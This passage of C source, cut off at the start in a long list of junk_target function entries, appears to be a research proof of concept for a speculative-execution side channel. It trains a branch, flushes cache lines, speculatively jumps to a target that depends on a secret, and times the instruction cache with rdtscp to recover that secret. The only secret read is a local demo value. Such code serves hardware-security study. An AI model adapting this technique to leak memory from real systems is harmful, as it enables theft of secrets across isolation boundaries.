    junk_target1118,
    junk_target1119,
    junk_target1120,
    junk_target1121,
    junk_target1122,
    junk_target1123,
    junk_target1124,
    junk_target1125,
    junk_target1126,
    junk_target1127,
    junk_target1128,
    junk_target1129,
    junk_target1130,
    junk_target1131,
    junk_target1132,
    junk_target1133,
    junk_target1134,
    junk_target1135,
    junk_target1136,
    junk_target1137,
    junk_target1138,
    junk_target1139,
    junk_target1140,
    junk_target1141,
    junk_target1142,
    junk_target1143,
    junk_target1144,
    junk_target1145,
    junk_target1146,
    junk_target1147,
    junk_target1148,
    junk_target1149,
    junk_target1150,
    junk_target1151,
    junk_target1152,
    junk_target1153,
    junk_target1154,
    junk_target1155,
    junk_target1156,
    junk_target1157,
    junk_target1158,
    junk_target1159,
    junk_target1160,
    junk_target1161,
    junk_target1162,
    junk_target1163,
    junk_target1164,
    junk_target1165,
    junk_target1166,
    junk_target1167,
    junk_target1168,
    junk_target1169,
    junk_target1170,
    junk_target1171,
    junk_target1172,
    junk_target1173,
    junk_target1174,
    junk_target1175,
    junk_target1176,
    junk_target1177,
    junk_target1178,
    junk_target1179,
    junk_target1180,
    junk_target1181,
    junk_target1182,
    junk_target1183,
    junk_target1184,
    junk_target1185,
    junk_target1186,
    junk_target1187,
    junk_target1188,
    junk_target1189,
    junk_target1190,
    junk_target1191,
    junk_target1192,
    junk_target1193,
    junk_target1194,
    junk_target1195,
    junk_target1196,
    junk_target1197,
    junk_target1198,
    junk_target1199,
    junk_target1200,
    junk_target1201,
    junk_target1202,
    junk_target1203,
    junk_target1204,
    junk_target1205,
    junk_target1206,
    junk_target1207,
    junk_target1208,
    junk_target1209,
    junk_target1210,
    junk_target1211,
    junk_target1212,
    junk_target1213,
    junk_target1214,
    junk_target1215,
    junk_target1216,
    junk_target1217,
    junk_target1218,
    junk_target1219,
    junk_target1220,
    junk_target1221,
    junk_target1222,
    junk_target1223,
    junk_target1224,
    junk_target1225,
    junk_target1226,
    junk_target1227,
    junk_target1228,
    junk_target1229,
    junk_target1230,
    junk_target1231,
    junk_target1232,
    junk_target1233,
    junk_target1234,
    junk_target1235,
    junk_target1236,
    junk_target1237,
    junk_target1238,
    junk_target1239,
    junk_target1240,
    junk_target1241,
    junk_target1242,
    junk_target1243,
    junk_target1244,
    junk_target1245,
    junk_target1246,
    junk_target1247,
    junk_target1248,
    junk_target1249,
    junk_target1250,
    junk_target1251,
    junk_target1252,
    junk_target1253,
    junk_target1254,
    junk_target1255,
    junk_target1256,
    junk_target1257,
    junk_target1258,
    junk_target1259,
    junk_target1260,
    junk_target1261,
    junk_target1262,
    junk_target1263,
    junk_target1264,
    junk_target1265,
    junk_target1266,
    junk_target1267,
    junk_target1268,
    junk_target1269,
    junk_target1270,
    junk_target1271,
    junk_target1272,
    junk_target1273,
    junk_target1274,
    junk_target1275,
    junk_target1276,
    junk_target1277,
    junk_target1278,
    junk_target1279,
    junk_target1280,
    junk_target1281,
    junk_target1282,
    junk_target1283,
    junk_target1284,
    junk_target1285,
    junk_target1286,
    junk_target1287,
    junk_target1288,
    junk_target1289,
    junk_target1290,
    junk_target1291,
    junk_target1292,
    junk_target1293,
    junk_target1294,
    junk_target1295,
    junk_target1296,
    junk_target1297,
    junk_target1298,
    junk_target1299,
    junk_target1300,
    junk_target1301,
    junk_target1302,
    junk_target1303,
    junk_target1304,
    junk_target1305,
    junk_target1306,
    junk_target1307,
    junk_target1308,
    junk_target1309,
    junk_target1310,
    junk_target1311,
    junk_target1312,
    junk_target1313,
    junk_target1314,
    junk_target1315,
    junk_target1316,
    junk_target1317,
    junk_target1318,
    junk_target1319,
    junk_target1320,
    junk_target1321,
    junk_target1322,
    junk_target1323,
    junk_target1324,
    junk_target1325,
    junk_target1326,
    junk_target1327,
    junk_target1328,
    junk_target1329,
    junk_target1330,
    junk_target1331,
    junk_target1332,
    junk_target1333,
    junk_target1334,
    junk_target1335,
    junk_target1336,
    junk_target1337,
    junk_target1338,
    junk_target1339,
    junk_target1340,
    junk_target1341,
    junk_target1342,
    junk_target1343,
    junk_target1344,
    junk_target1345,
    junk_target1346,
    junk_target1347,
    junk_target1348,
    junk_target1349,
    junk_target1350,
    junk_target1351,
    junk_target1352,
    junk_target1353,
    junk_target1354,
    junk_target1355,
    junk_target1356,
    junk_target1357,
    junk_target1358,
    junk_target1359,
    junk_target1360,
    junk_target1361,
    junk_target1362,
    junk_target1363,
    junk_target1364,
    junk_target1365,
    junk_target1366,
    junk_target1367,
    junk_target1368,
    junk_target1369,
    junk_target1370,
    junk_target1371,
    junk_target1372,
    junk_target1373,
    junk_target1374,
    junk_target1375,
    junk_target1376,
    junk_target1377,
    junk_target1378,
    junk_target1379,
    junk_target1380,
    junk_target1381,
    junk_target1382,
    junk_target1383,
    junk_target1384,
    junk_target1385,
    junk_target1386,
    junk_target1387,
    junk_target1388,
    junk_target1389,
    junk_target1390,
    junk_target1391,
    junk_target1392,
    junk_target1393,
    junk_target1394,
    junk_target1395,
    junk_target1396,
    junk_target1397,
    junk_target1398,
    junk_target1399,
    junk_target1400,
    junk_target1401,
    junk_target1402,
    junk_target1403,
    junk_target1404,
    junk_target1405,
    junk_target1406,
    junk_target1407,
    junk_target1408,
    junk_target1409,
    junk_target1410,
    junk_target1411,
    junk_target1412,
    junk_target1413,
    junk_target1414,
    junk_target1415,
    junk_target1416,
    junk_target1417,
    junk_target1418,
    junk_target1419,
    junk_target1420,
    junk_target1421,
    junk_target1422,
    junk_target1423,
    junk_target1424,
    junk_target1425,
    junk_target1426,
    junk_target1427,
    junk_target1428,
    junk_target1429,
    junk_target1430,
    junk_target1431,
    junk_target1432,
    junk_target1433,
    junk_target1434,
    junk_target1435,
    junk_target1436,
    junk_target1437,
    junk_target1438,
    junk_target1439,
    junk_target1440,
    junk_target1441,
    junk_target1442,
    junk_target1443,
    junk_target1444,
    junk_target1445,
    junk_target1446,
    junk_target1447,
    junk_target1448,
    junk_target1449,
    junk_target1450,
    junk_target1451,
    junk_target1452,
    junk_target1453,
    junk_target1454,
    junk_target1455,
    junk_target1456,
    junk_target1457,
    junk_target1458,
    junk_target1459,
    junk_target1460,
    junk_target1461,
    junk_target1462,
    junk_target1463,
    junk_target1464,
    junk_target1465,
    junk_target1466,
    junk_target1467,
    junk_target1468,
    junk_target1469,
    junk_target1470,
    junk_target1471,
    junk_target1472,
    junk_target1473,
    junk_target1474,
    junk_target1475,
    junk_target1476,
    junk_target1477,
    junk_target1478,
    junk_target1479,
    junk_target1480,
    junk_target1481,
    junk_target1482,
    junk_target1483,
    junk_target1484,
    junk_target1485,
    junk_target1486,
    junk_target1487,
    junk_target1488,
    junk_target1489,
    junk_target1490,
    junk_target1491,
    junk_target1492,
    junk_target1493,
    junk_target1494,
    junk_target1495,
    junk_target1496,
    junk_target1497,
    junk_target1498,
    junk_target1499,
    junk_target1500,
    junk_target1501,
    junk_target1502,
    junk_target1503,
    junk_target1504,
    junk_target1505,
    junk_target1506,
    junk_target1507,
    junk_target1508,
    junk_target1509,
    junk_target1510,
    junk_target1511,
    junk_target1512,
    junk_target1513,
    junk_target1514,
    junk_target1515,
    junk_target1516,
    junk_target1517,
    junk_target1518,
    junk_target1519,
    junk_target1520,
    junk_target1521,
    junk_target1522,
    junk_target1523,
    junk_target1524,
    junk_target1525,
    junk_target1526,
    junk_target1527,
    junk_target1528,
    junk_target1529,
    junk_target1530,
    junk_target1531,
    junk_target1532,
    junk_target1533,
    junk_target1534,
};


/*
 * Selects the address we jump to
 * @param x : where we store the address
 * @param addr1 : our usual target
 * @param addr2 : our speculative target
 * @param selector : the counter that determines the target
 */
#define SELECT_TARGET_VADDR(x, addr1, addr2, selector) \
    /* x == 0x0 if selector is 0, otherwise x == 0xFFFFFFFFFFFFFFFF*/ \
    x = (selector == 0) * ~0x0;  \
    /* if selctor != 0 --> return addr1. if selector == 0 --> return addr 2*/ \
    x = addr1 ^ (x & (addr2 ^ addr1));

// last entry in targets array is reserved for our junk func
int junk_target_index = -1;

/* the address of junk_target_index */
volatile uint64_t benign_vaddr = (uint64_t) &junk_target_index;

/* ptr to our benign address (to cause a delay) */
volatile uint64_t *benign_vaddr_ptr = &benign_vaddr;

/* ptr to our benign address ptr (to cause a bigger delay) */
volatile uint64_t **benign_vaddr_ptr_ptr = &benign_vaddr_ptr;

/*
 * Suppresses fault, so that we only SPECULATIVELY jump to victim_addr
 * @param victim_vaddr : the secret address we want to read
 */
void train_then_speculatively_jump(uint64_t victim_vaddr, int guess)
{
    uint64_t selected_target_vaddr;
    
    for (int j = 14; j >= 0 ; j--) {
        SELECT_TARGET_VADDR(
            selected_target_vaddr, benign_vaddr, victim_vaddr, j);

        // flush from the cache
        clflush( (void*) &benign_vaddr_ptr);
        
        // Stall to make sure these changes have gone through the pipeline
        for (volatile int z = 0; z < STALL_ITERS; z++) {};

        // Speculatively load secret value-dependent target into the icache
        if (selected_target_vaddr == *benign_vaddr_ptr) {
            targets[(*((int *) selected_target_vaddr) + 1) * 512]();
        } 
    }
}

/*
 * Error func for improper use of script
 * Does not return to caller
 */
void die_usage(void)
{
    fprintf(stderr, "Usage: ./bpu_mem_icache_branch\n");
    exit(1);
}

int main(int argc, char **argv)
{
    if (argc > 1) {
        die_usage();
    }

    /* Show result when secret val is 0 vs 1 */

    for (int secret_value = 0; secret_value < NUM_POSSIBLE_ANSWERS; secret_value++) {
        /* Recorded times for each of NUM_POSSIBLE_ANSWERS secret_value guesses each trial */
        uint64_t times[NUM_POSSIBLE_ANSWERS];

        /* Timer */
        register uint64_t start_time;

        fprintf(stderr, "\n%sSECRET=%i\n%s", YLW, secret_value, DEFAULT);
        fprintf(stderr, "%sGuess Value,Cycles\n%s", YLW, DEFAULT);

        /* loop through all NUM_POSSIBLE_ANSWERS possible values */
        /* Running it twice required for accuracy */
        for (int i = 0; i < 2; i++) {
            for (register int guess = 0; guess < NUM_POSSIBLE_ANSWERS; guess++) {
                clflush(targets);
                clflush(targets + 1 * 512);
                clflush(targets + 2 * 512);
                train_then_speculatively_jump((uint64_t) &secret_value, guess);

                /* stall pipe to make speculation has occurred */
                for (volatile int x = 0; x < STALL_ITERS; x++) {};

                /* record time for this value */
                start_time = rdtscp();
                targets[(guess + 1) * 512]();
                times[guess] = rdtscp() - start_time;
            };
        }

        // determine what guess is most likely based on times for this trial
        uint64_t min_time = UINT64_MAX;
        int guess = 0;
        for (int i = 0; i < NUM_POSSIBLE_ANSWERS; i++) {
            fprintf(stderr, "%s%i,%lu\n%s", YLW, i, times[i], DEFAULT);
            if (times[i] < min_time) {
                min_time = times[i];
                guess = i;
            }
        }
    }
        
    return 0;
}
